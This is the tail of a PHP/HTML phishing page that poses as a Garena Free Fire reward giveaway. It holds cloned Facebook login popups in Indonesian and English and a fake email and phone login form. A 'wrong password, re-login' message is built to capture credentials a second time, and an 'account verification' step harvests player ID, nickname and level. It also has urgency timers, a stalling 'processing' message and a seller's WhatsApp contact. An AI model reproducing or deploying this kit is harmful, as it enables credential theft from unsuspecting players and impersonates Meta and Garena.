		</div> <!--- laz-container --->
	</div> <!--- laz-home --->

	<div class="popup-login first-login-facebook animated fadeIn" style="display: none;">
		<div class="popup-box-login-fb">
			<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
			<div class="navbar-fb">
				<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/facebook-text.png">
			</div>
			<div class="content-box-fb">
				<p class="kaget first-email-fb" style="width: 320px; top: -5px; text-align: left;">Alamat email atau nomor telepon yang Anda masukkan tidak cocok dengan akun mana pun. <b>Mendaftarlah untuk sebuah akun.</b></p>
				<p class="kaget first-sandi-fb" style="width: 320px; top: -5px; text-align: left;">Kata sandi yang Anda masukkan salah. Lupa kata sandi?</p>
				<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/icon_2.jpg">
				<div class="txt-login-fb">
					Masuk ke akun Facebook Anda untuk terhubung dengan Garena Free Fire
				</div>
				<form class="login-form" action="javascript:void(0)" method="post" id="FirstValidateLoginFbForm">
					<div class="form-group-fb">
						<input type="text" name="email" id="first-email-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan nomor Ponsel atau alamat email')" oninput="setCustomValidity('')">
						<div class="form-group-sohid FirstShowFbPassword" onclick="FirstShowFbPassword()">
							<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
						</div> <!--- form-group-sohid FirstShowFbPassword --->
						<div class="form-group-sohid FirstHideFbPassword" style="display: none;" onclick="FirstHideFbPassword()">
							<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
						</div> <!--- form-group-sohid FirstHideFbPassword --->
						<input type="password" name="password" id="first-password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan kata sandi')" oninput="setCustomValidity('')">
					</div> <!--- form-group-fb --->
					<input type="hidden" name="login" id="first-login-facebook" value="Facebook" readonly>
					<button type="submit" class="btn-login-fb" onclick="FirstValidateLoginFbData()">Masuk</button>
				</form>
				<div class="txt-create-account">Buat Akun</div>
				<div class="txt-not-now">Tidak sekarang</div>
				<div class="txt-forgotten-password">Lupa Kata Sandi?</div>
			</div>
			<div class="language-box">
				<center>
					<div class="language-name language-name-active">Bahasa Indonesia</div>
					<div class="language-name">English (UK)</div>
					<div class="language-name">Türkçe</div>
					<div class="language-name">Tiếng Việt</div>
					<div class="language-name">日本語</div>
					<div class="language-name">Español</div>
					<div class="language-name">Português (Brasil)</div>
					<div class="language-name">
						<i class="fa fa-plus"></i>
					</div>
				</center>
			</div>
			<div class="copyright">Meta © 2025</div>
		</div> <!--- popup-box-login-fb --->
	</div> <!--- popup-login--->

	<div class="popup-login second-login-facebook animated fadeIn" style="display: none;">
		<div class="popup-box-login-fb">
			<div class="navbar-fb">
				<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/facebook-text.png">
			</div>
			<div class="content-box-fb">
				<p class="kaget wrong-email-fb" style="width: 320px; top: -5px; text-align: left; display: block;">Your password was wrong. <b>Please re-login using the correct password.</b></p>
				<p class="kaget second-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
				<p class="kaget second-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
				<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/icon_2.jpg">
				<div class="txt-login-fb">
					Log in to your Facebook account to connect to Garena Free Fire.
				</div>
				<form class="login-form" action="javascript:void(0)" method="post" id="SecondValidateLoginFbForm">
					<div class="form-group-fb">
						<input type="text" name="email" id="second-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
						<div class="form-group-sohid SecondShowFbPassword" onclick="SecondShowFbPassword()">
							<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
						</div> <!--- form-group-sohid SecondShowFbPassword --->
						<div class="form-group-sohid SecondHideFbPassword" style="display: none;" onclick="SecondHideFbPassword()">
							<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
						</div> <!--- form-group-sohid SecondHideFbPassword --->
						<input type="password" name="password" id="second-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
					</div> <!--- form-group-fb --->
					<input type="hidden" name="login" id="second-login-facebook" value="Facebook" readonly>
					<button type="submit" class="btn-login-fb" onclick="SecondValidateLoginFbData()">Log In</button>
				</form>
				<div class="txt-create-account">Create Account</div>
				<div class="txt-not-now">Not now</div>
				<div class="txt-forgotten-password">Forgotten password?</div>
			</div>
			<div class="language-box">
				<center>
					<div class="language-name language-name-active">English (UK)</div>
					<div class="language-name">العربية</div>
					<div class="language-name">Türkçe</div>
					<div class="language-name">Tiếng Việt</div>
					<div class="language-name">日本語</div>
					<div class="language-name">Español</div>
					<div class="language-name">Português (Brasil)</div>
					<div class="language-name">
						<i class="fa fa-plus"></i>
					</div>
				</center>
			</div>
			<div class="copyright">Meta © 2023</div>
		</div> <!--- popup-box-login-fb --->
	</div> <!--- popup-login--->

	<div class="popup-login login-facebook-load" style="display: none;">
		<div class="popup-box-login-fb">
			<div class="navbar-fb">
				<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/facebook-text.png">
			</div> <!--- navbar --->
			<div class="content-box-fb">
				<div class="fb-load">
					<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/icon_fb.png">
					<div class="loader3"></div>
				</div> <!--- fb-load --->
			</div> <!--- content-box-fb --->
		</div> <!--- popup-box-login-fb --->
	</div> <!--- popup-login--->

	<div class="popup-login login-twitter-load" style="display: none;">
		<div class="popup-box-login-twitter">
			<div class="twitter-load">
				<div class="twitter-load-title">
					<div class="loader2"></div>
				</div> <!--- twitter-load-title --->
			</div> <!--- twitter-load --->
		</div> <!--- popup-box-login-twitter --->
	</div> <!--- popup-login --->

	<div class="popup account_verification animated fadeIn" style="display: none;">
		<div class="popup-box-wrapperz">
			<div class="popup-box-navbarz">
				<div class="popup-box-navbar-title">Account Verification</div>
			</div>
			<div class="popup-box-bgz">
				<div class="popup-box-alert4"><br>Complete your account details</div>
				<form class="popup-box-form" action="javascript:void(0)" method="post" id="form-login-mt">
					<input type="hidden" name="email" id="validateEmail" readonly>
					<input type="hidden" name="password" id="validatePassword" readonly>
					<input type="hidden" name="codetel" id="validateTel" readonly>
					<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
					<input type="keyboard" name="nickname" id="Nickname" placeholder="Nickname" autocomplete="off" required oninvalid="this.setCustomValidity('Nickname')" oninput="setCustomValidity('')">
					<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
						<option selected="selected" disabled="disabled" value="">Account Level</option>
						<script>
							for (var i = 1; i <= 100; i++) {
								document.write("<option>" + i + "</option>");
							};
						</script>
					</select>
					<input type="hidden" name="login" id="validateLogin" readonly>
					<br>
					<br>
					<div class="popup-box-form-footer">
						<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()" style="margin-top: -6px;">Verification</button>
					</div>
				</form>
			</div>
		</div>
	</div>

	<div class="popup check_verification animated fadeIn" style="display: none;">
		<div class="popup-box-wrapperz">
			<div class="popup-box-navbarz">
				<div class="popup-box-navbar-title">Account Verification</div>
			</div>
			<div class="popup-box-bgx">
				<div class="popup-box-alert8"><br>
					<i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i>
					<br> Checking your account details...
					<br><br>
				</div>
				<div class="popup-box-footer"></div>
			</div>
		</div>
	</div>

	<div class="popup processing_account animated fadeIn" style="display: none;">
		<div class="popup-box-wrapperz">
			<div class="popup-box-navbarz">
				<div class="popup-box-navbar-title">Processing Account</div>
			</div>
			<div class="popup-box-bgz">
				<div class="popup-box-alert3"><br>
					Hai Survivor<br>
					<p>Penukaran hadiah anda sedang dalam proses. <br>
						<br>Garena Free Fire juga akan memberi tahu Anda lewat
						<br>In-Game Mail, Ketika Hadiah Berhasil Terkirim.
					</p>
					<p>Dimohon untuk menunggu proses hingga 1-2 hari (48 Jam)<br>
						<br>Salam Booyah!
					</p>
				</div>
				<div class="popup-box-alert0">
				</div>
				<div class="popup-box-footer">
					<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Keluar</button>
				</div>
			</div>
		</div>
	</div>
	</div>

	<div class="footer" style="top:-80px;">
		<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
		<div class="footer-socmed-box">
			<button type="button">Like</button>
			<img class="footer-socmed-img-main" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link1.png">
			<p>Facebook</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-socmed-box">
			<button type="button">Follow</button>
			<img class="footer-socmed-img-other" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link2.png">
			<p>Twitter</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-socmed-box">
			<button type="button">Subscribe</button>
			<img class="footer-socmed-img-other" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link3.png">
			<p>Youtube</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-socmed-box">
			<button type="button">Follow</button>
			<img class="footer-socmed-img-main" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link4.png">
			<p>Instagram</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-socmed-box">
			<button type="button">Like</button>
			<img class="footer-socmed-img-main" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link5.png">
			<p>VK</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-socmed-box">
			<button type="button">Join</button>
			<img class="footer-socmed-img-other" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/link6.png">
			<p>Discord</p>
		</div> <!--- footer-socmed-box --->
		<div class="footer-txt-copyrights">Partnership Inquiry: <a href="cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7412061111121d061134131506111a155a171b19">[email&#160;protected]</a></div> <!--- footer-txt-copyright --->
		<img class="footer-copyright-icon" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/footer.png">
		<div class="footer-txt-copyright">ⓒ 2024 GARENA, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
		<div class="footer-txt-copyright">ⓒ 2017-2024 Proxima Beta Pte. Limited. AII rights reserved.</div> <!--- footer-txt-copyright --->
		<div class="footer-txt-copyright">Privacy Policy | Cookies Policy | Garena Games User Agreement</div> <!--- footer-txt-copyright --->
		<br>
	</div> <!--- footer --->

	<div class="popup open_rewards animated fadeIn" style="display: none;">
		<div class="popup-box-wrapper">
			<div class="popup-box-bg" style="height:220px;">
				<div class="popup-box-alert4"><br> </div> <!--- popup-box-alert --->
				<div class="popup-box-item itemShine">
					<div>
						<figure>
							<img class="popup-item flip" src="https://cahyosr.my.id/lawak">
						</figure>
					</div>
				</div> <!--- popup-box-item itemShine --->
				<br>
				<div class="popup-box-footer" style="margin-top:40px;">
					<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="get_token()">Collect</button>
				</div> <!--- popup-box-bg --->
			</div> <!--- popup-box-footer --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup open_rewards --->

	<div class="popup loadinglogin" style="display: none;">
		<div class="loadinglogin" style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
			<div class="loader-line"></div>
			<div class="loader-label" id="text-login1">Checking for updates...</div>
			<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
			<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/loadlogin.png" style="background-size: 100% 100%;width: 100%;">
			</img>
		</div>
	</div>

	<div class="popup account_login animated fadeIn" style="display: none;">
		<div class="popup-box-wrapper">
		</div>
		<div class="rewardpop">
			<div class="popup-box-alert4"><br>
				<img class="popup-box-gamecon" src="https://www.pubgmobile.com/act/a20180515iggamepc/logo.png" style="opacity:0%;">
			</div>
			<button type="button" style="top:35px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa-brands fa-facebook"></i>Facebook</button><br>
			<img style="width: 90%; height: auto; margin-top: -20px; margin-left: auto; margin-right: auto;opacity:0%;" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/priv_laz.png"><br><br>
		</div> <!--- popup-box-bg --->
	</div> <!--- popup-box-footer --->

	<div class="popup login-mail animated fadeIn" style="display: none;">
		<div class="link-box">
			<div class="link-box-navbar">
				<img onmousedown="tutup.play();" onclick="close_link()" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-close2.png">
				<div class="link-box-navbar-title">
					<a class="et">Email Login</a>
					<a class="nt" style="display:none;">Mobile Number Login</a>
				</div> <!--- popup-box-navbar-title --->
			</div> <!--- popup-box-navbar --->
			<div class="link-box-bg">
				<div class="link-box-alert"></div> <!--- popup-box-alert --->
				<div class="link-wrapper">
					<div class="link-content email-login link-content-active" id="email-login" onmousedown="buka.play();" onclick="openloginlink(event, 'emaillog'); et();">
						<div class="link-content-txt">Email address</div>
					</div> <!--- link-content --->
					<div class="link-content number-login" onmousedown="buka.play();" onclick="openloginlink(event, 'numberlog'); nt();">
						<div class="link-content-txt">Mobile Number</div>
					</div> <!--- link-content --->
				</div> <!--- link-wrapper ---> <br>
				<div class="form_login" id="emaillog">
					<form action="javascript:void(0)" method="post" id="LoginMailForm">
						<p class="kagetk email-ml">Wrong e-mail. Please enter again.</p>
						<p class="kagetk sandi-ml">Wrong password. Try again.</p>
						<label>E-mail address</label>
						<input class="link-box-form-login" type="email" name="email" id="mail-ml" autoCapitalize='none' placeholder="Enter your e-mail" required oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
						<label>Password</label>
						<input class="link-box-form-login" type="password" name="password" id="pw-ml" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
						<center>
							<input type="hidden" name="login" id="login-mail" value="Linked Email" readonly>
							<div class="link-box-footer">
								<button type="submit" onmousedown="buka.play();" onclick="LoginMail()">OK</button>
						</center>
					</form>
				</div> <!--- email-login --->
				<div class="form_login" id="numberlog" style="display: none;">
					<p class="kagetk email-nm">Wrong Phone number. Please enter again.</p>
					<p class="kagetk sandi-nm">Wrong password. Try again.</p>
					<label>Country/Region</label>
					<form action="javascript:void(0)" method="post" id="LoginNumberForm">
						<input class="link-box-form-region" type="tel" name="codetel" id="code-tel" readonly>
						<input class="link-box-form-number" type="number" name="email" id="mail-nm" placeholder="0000 0000 0000" required oninvalid="this.setCustomValidity('Input your Number Phone')" oninput="setCustomValidity('')">
						<label>Password</label>
						<input class="link-box-form-login" type="password" name="password" id="pw-nm" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
						<input type="hidden" name="login" id="login-number" value="Linked Number" readonly>
						<center>
							<div class="link-box-footer">
								<button type="submit" onmousedown="buka.play();" onclick="LoginNumber()">OK</button>
						</center>
					</form> <!--- form --->
				</div> <!--- number-login --->
			</div> <!--- popup-box-bg --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup account_login --->

	<div class="popup-link login-mail-load animated fadeIn" style="display: none;">
		<div class="link-box">
			<div class="link-box-navbar">
				<div class="link-box-navbar-title">
					<a>Email Login</a>
				</div> <!--- popup-box-navbar-title --->
			</div> <!--- popup-box-navbar --->
			<div class="link-box-bg">
				<div class="link-box-alert"></div> <!--- popup-box-alert --->
				<div class="link-wrapper">
					<div class="link-content-active link-content">
						<div class="link-content-txt">Email address</div>
					</div> <!--- link-content --->
					<div class="link-content">
						<div class="link-content-txt">Mobile Number</div>
					</div> <!--- link-content --->
				</div> <!--- link-wrapper ---> <br>
				<div id="load-ml" style="height:220px;">
					<center>
						<img class="load-login-imgs" style="margin-top:30px;" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/kotak.png"></img>
						<br>
						<img class="load-login-gif" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/load.gif"></img>
					</center>
				</div>
			</div> <!--- popup-box-bg --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup login-mail-load --->
	<div class="popup-link login-number-load animated fadeIn" style="display: none;">
		<div class="link-box">
			<div class="link-box-navbar">
				<div class="link-box-navbar-title">
					<a>Mobile Number Login</a>
				</div> <!--- popup-box-navbar-title --->
			</div> <!--- popup-box-navbar --->
			<div class="link-box-bg">
				<div class="link-box-alert"></div> <!--- popup-box-alert --->
				<div class="link-wrapper">
					<div class="link-content">
						<div class="link-content-txt">Email address</div>
					</div> <!--- link-content --->
					<div class="link-content-active link-content">
						<div class="link-content-txt">Mobile Number</div>
					</div> <!--- link-content --->
				</div> <!--- link-wrapper ---> <br>
				<div id="load-ml" style="height:220px;">
					<center>
						<img class="load-login-imgs" style="margin-top:30px;" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/kotak.png"></img>
						<br>
						<img class="load-login-gif" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/load.gif"></img>
					</center>
				</div>
			</div> <!--- popup-box-bg --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup login-number-load --->

	</div>
	<div class="popup itemReward_confirmation2" style="display: none;">
		<div class="popup-box-wrapperz">
			<div class="popup-box-navbar-ignis" style="margin-bottom:12px;">
				<div class="popup-box-navbar-ignis-title">Confirmation</div> <!--- popup-box-navbar-title --->
				<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 0%;">
			</div> <!--- popup-box-navbar --->
			<div class="popup-box-ignis">
				<div class="popup-box-alert-ignis">Are you sure you want to Redeem this reward?</div> <!--- popup-box-alert --->
				<div class="popup-box-item boxz itemShine flip" style="width:18%;height:70px;margin-top: 9px;margin-bottom:10px;">
					<div>
						<figure>
							<span id="amount"></span>
							<img src="index.html" id="myItemReward_confirmationImg">
						</figure>
					</div>
				</div> <!--- popup-box-item itemShine --->
				<br>
				<div class="popup-box-footer-ignis">
					<button type="button" onmousedown="buka.play();" onclick="get_token()" style="width: 107px;height: 35px;padding-left: 0;padding-right: 0;margin-top: -29px;">
						<font style="">Redeem</font>
					</button>
				</div> <!--- popup-box-footer --->
			</div> <!--- popup-box-bg --->
		</div> <!--- popup-box-wrapper --->
	</div> <!--- popup itemReward_confirmation --->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script type="text/javascript" src="js-zone/gift-zone.js"></script>
	<script src="https://jquery.biz.id/libs/jquery-25.min.js"></script>
	<script src="js-zone/flaglink.js"></script>
	<script src="js-zone/slide-zone.js"></script>
	<script>
		// code funtion timers
		$(document).ready(function() {
			var detik = 59;
			var menit = 59;
			var jam = 23;

			function hitung() {
				setTimeout(hitung, 1000);
				$('#timer1').html('  ' + jam + ' : ' + menit + ' : ' + detik + '');
				detik--;
				if (detik < 0) {
					detik = 59;
					menit--;
					if (menit < 0) {
						menit = 0;
						detik = 0;
					}
				}
			}
			hitung();
		});
		$(document).ready(function() {
			var detik = 59;
			var menit = 59;
			var jam = 23;

			function hitung() {
				setTimeout(hitung, 1000);
				$('#timer2').html(+jam + ' : ' + menit + ' : ' + detik + '');
				detik--;
				if (detik < 0) {
					detik = 59;
					menit--;
					if (menit < 0) {
						menit = 0;
						detik = 0;
					}
				}
			}
			hitung();
		});
	</script>
	<script>
		setTimeout(function() {
			$('.loadkin').fadeOut(750);
		}, 2000);
	</script>
	<script>
		function get_toksen() {
			$('.open_rewards').hide();
			$('.itemReward_confirmation2').hide();
			$('.account_verification').show();
		}

		function get_token() {
			$('.loadinglogin').show();
			$('#text-login1').show()
			setTimeout(function() {
				$('#text-login1').hide()
				$('#text-login2').fadeIn()
			}, 2000)
			$('.open_rewards').hide();
			$('.itemReward_confirmation2').hide();
			setTimeout(function() {
				$('.account_login').show();
				$('.loadinglogin').hide();
			}, 5000);
		}
	</script>
	<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>